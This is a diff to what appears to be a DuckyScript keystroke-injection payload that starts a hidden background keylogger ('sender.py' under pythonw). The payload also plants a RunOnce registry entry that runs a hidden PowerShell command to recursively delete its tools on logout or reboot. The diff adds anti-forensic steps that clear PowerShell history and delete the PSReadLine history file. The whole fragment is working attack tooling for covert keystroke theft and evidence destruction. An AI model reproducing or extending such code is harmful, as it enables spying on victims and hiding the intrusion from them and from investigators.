@@ -22,5 +22,10 @@ REM Implement a self-destruct protocol to delete all traces upon logout/reboot/s
 STRINGLN $deleteCommand = "powershell -w h -c `"Remove-Item -Path '$tools' -Recurse -Force`""
 STRINGLN Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\RunOnce" -Name "VOID" -Value $deleteCommand
 
-REM Start the keylogger in the background and exit
+REM Start the keylogger in the background
 STRINGLN & "$tools\pythonw.exe" "$tools\sender.py"
+
+REM Cleanup tasks and exit
+STRINGLN Clear-History
+STRINGLN Remove-Item "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt" -Force
+STRINGLN exit
